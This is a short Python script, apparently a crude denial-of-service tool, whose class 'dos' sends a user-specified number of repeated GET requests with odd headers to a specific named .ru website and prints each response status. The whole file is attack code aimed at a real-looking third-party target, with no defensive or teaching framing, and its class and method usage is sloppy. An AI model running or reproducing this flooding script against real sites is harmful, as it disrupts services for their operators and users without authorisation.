#-- coding: utf8 --
#!/usr/bin/env python3

import time, requests, random 



class dos():

	

	def go(self):

		for x in range(0, self):
			r = requests.get('https://thepobelka.ru/?page=news&q=JmNhdGVnb3J5PUt2YXJ0aXJhJmlkPTE0Mg==', headers={'Cache-Control': 'max-age=3600', 'Accept-Ranges':'99999', 'Accept-Encoding': 'gzip', 'Content-Length':'1348'})
	
			
			print('----------------------')
			print('num'+str(x))
			print( round( time.process_time(),2 ) )
			print(r.status_code)
			print('----------------------')



it = int(input('num iteretion: '))

dos.go(it)





# print(str(x)+' work');
# print(time.process_time())


